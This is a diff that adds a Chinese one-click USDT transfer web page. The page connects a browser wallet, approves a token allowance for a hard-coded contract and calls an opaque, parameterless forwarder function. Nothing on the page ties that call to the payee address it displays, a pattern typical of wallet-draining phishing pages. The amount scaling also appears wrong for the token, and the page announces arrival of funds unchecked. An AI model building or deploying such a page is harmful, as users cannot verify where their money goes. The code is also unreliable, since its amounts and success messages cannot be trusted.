@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT 一键转账</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; margin: 0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+    .card { background: white; border-radius: 20px; padding: 30px; width: 100%; max-width: 420px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
+    h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
+    .address { background: #f8f9fa; padding: 12px; border-radius: 12px; font-family: monospace; font-size: 14px; word-break: break-all; color: #1a73e8; margin: 15px 0; }
+    input { width: 100%; padding: 14px; margin: 15px 0; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; }
+    input:focus { border-color: #1a73e8; outline: none; }
+    button { width: 100%; padding: 16px; margin: 20px 0 10px; background: #1a73e8; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    button:hover { background: #1557b0; }
+    #status { margin-top: 15px; padding: 12px; border-radius: 12px; font-size: 14px; min-height: 50px; display: flex; align-items: center; justify-content: center; }
+    .success { background: #d4edda; color: #155724; }
+    .error { background: #f8d7da; color: #721c24; }
+    .info { background: #d1ecf1; color: #0c5460; }
+    .loading { background: #fff3cd; color: #856404; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>USDT 自动转账</h1>
+    <div class="address">收款: 0x8755e7cF487F28662BFfCd8549063CeF73392F9a</div>
+    <input type="number" id="amount" placeholder="输入 USDT 数量（如 10）" step="0.000001">
+    <button onclick="transfer()">一键转账</button>
+    <div id="status" class="info">正在检测钱包...</div>
+  </div>
+
+  <script>
+    const CONTRACT = "0xDBab099b99f472917a792F54734F183Aed6257eF";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const ABI_USDT = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+
+    let web3, account;
+    const status = document.getElementById("status");
+
+    async function connect() {
+      if (!window.ethereum) {
+        status.className = "error";
+        status.innerText = "未检测到钱包插件";
+        return false;
+      }
+      try {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+        }
+        [account] = await web3.eth.getAccounts();
+        status.className = "success";
+        status.innerText = `已连接: ${account.slice(0,8)}...${account.slice(-6)}`;
+        return true;
+      } catch (e) {
+        status.className = "error";
+        status.innerText = "连接失败";
+        return false;
+      }
+    }
+
+    async function transfer() {
+      const amount = document.getElementById("amount").value;
+      if (!amount || amount <= 0) return;
+      if (!await connect()) return;
+
+      const amountWei = web3.utils.toBN(amount * 1e6).toString();
+      status.className = "loading";
+      status.innerText = "正在授权...";
+
+      try {
+        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+        await usdt.methods.approve(CONTRACT, amountWei).send({ from: account });
+        status.innerText = "授权成功！正在转账...";
+        const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
+        await forwarder.methods.transferFromApproved().send({ from: account });
+        status.className = "success";
+        status.innerHTML = `转账成功！<br>${amount} USDT 已到账`;
+      } catch (e) {
+        status.className = "error";
+        status.innerText = e.code === 4001 ? "用户取消" : "交易失败";
+      }
+    }
+
+    window.onload = async () => {
+      if (window.ethereum && window.ethereum.selectedAddress) {
+        await connect();
+      } else {
+        status.innerText = "点击按钮连接钱包";
+      }
+    };
+  </script>
+</body>
+</html>
